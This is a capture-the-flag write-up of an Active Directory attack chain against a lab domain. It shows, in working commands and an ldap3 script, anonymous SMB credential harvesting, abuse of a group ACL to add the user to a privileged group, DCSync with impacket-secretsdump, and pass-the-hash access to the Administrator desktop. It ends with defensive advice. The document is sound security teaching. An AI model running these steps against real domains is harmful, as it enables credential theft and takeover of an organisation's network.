# Legacy IT: anonymous SMB, group ACL and DCSync

[По-русски](solve.ru.md)

## 1. Finding the starting account

The goal was to read the Administrator desktop flag on the `easyad.local` domain controller. Anonymous SMB access to the `Public` share revealed an `onboarding.txt` document containing the credentials for `trainee`:

```bash
smbclient -N //<DC>/Public -c 'get onboarding.txt'
# Anonymous login successful
# New IT trainee account; Domain: easyad.local; Username: trainee
```

The password and instance address are intentionally redacted. This was an exposed onboarding credential, not a password-cracking step.

## 2. Changing the group membership

Authenticated directory enumeration showed that `trainee` had `FullControl` over the `Legacy IT Admins` group. The identity's actual distinguished name was `CN=Jamie Smith,CN=Users,DC=easyad,DC=local`, despite the login name `trainee`. The working LDAP modification was:

```python
from ldap3 import Connection, Server, Tls, MODIFY_ADD

srv = Server("ldaps://<DC>", tls=Tls(validate=0))
conn = Connection(srv, user="trainee@easyad.local",
                  password="<ONBOARDING_PASSWORD>", auto_bind=True)
group = "CN=Legacy IT Admins,CN=Users,DC=easyad,DC=local"
user = "CN=Jamie Smith,CN=Users,DC=easyad,DC=local"
assert conn.modify(group, {"member": [(MODIFY_ADD, [user])]})
print(conn.result["description"])  # success
```

The recorded response was `mod: True success`; the group membership query then listed `Jamie Smith`. Earlier attempts with an unsupported Impacket `-ldaps` argument or the wrong LDAP bind format had failed.

## 3. Replicating the Administrator secret

The group's effective permissions allowed directory replication. With a fresh authentication as `trainee`, the following command succeeded:

```bash
impacket-secretsdump -just-dc-user Administrator \
  'easyad.local/trainee:<ONBOARDING_PASSWORD>@<DC>' -dc-ip <DC>
# [*] Using the DRSUAPI method to get NTDS.DIT secrets
# Administrator:500:<LM_HASH>:<NT_HASH>:::
```

This is **DCSync via DRSUAPI**, not a local SAM dump. The domain Administrator NT hash was then sufficient for SMB pass-the-hash authentication.

## 4. Accessing the flag

```text
impacket-smbclient -hashes :<ADMIN_NT_HASH> 'easyad.local/Administrator@<DC>'
use C$
ls Users\Administrator\Desktop
cat Users\Administrator\Desktop\flag.txt
```

The recorded session returned:

```text
PP{l3g4cy-1t-4dm1ns-4k4-w1nd0ws-4dm1ns::FqCiLH_9Sp7u}
```

**The flag was accepted by the competition platform.** The confirmed attack path is: anonymous `Public/onboarding.txt` → `trainee` → `FullControl` on `Legacy IT Admins` → add self to group → DCSync → Administrator NT hash → SMB desktop flag.

## 5. Defensive lesson

Avoid distributing live credentials on guest-readable shares, audit group ACLs for unnecessary `FullControl`, restrict domain replication rights and monitor group membership changes together with DRSUAPI activity. No obsolete SMB protocol exploit is necessary when the directory grants replication rights to a group a normal user can join.

See [sanitized checkpoints](evidence/session-checkpoints.md) extracted from the competition log.
